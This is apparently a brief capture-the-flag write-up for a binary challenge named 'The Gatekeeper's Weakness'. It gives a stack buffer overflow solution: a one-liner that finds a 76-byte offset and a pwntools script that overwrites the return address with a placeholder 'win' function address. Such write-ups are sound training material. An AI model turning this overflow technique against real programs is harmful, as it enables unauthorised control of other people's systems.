# The Gatekeeper's Weakness

Challenge author: 0x251e

## Solution:
1. Find the offset
`python3 -c "print('A' * 76)" | ./gatekeeper`
2. Find win function address
3. Craft exploit
```python
#!/usr/bin/env python3
from pwn import *
p = process('./gatekeeper')
win_addr = <replace with function address>
payload = b'A' * 76 + p32(win_addr)
p.sendline(payload)
p.interactive()
```
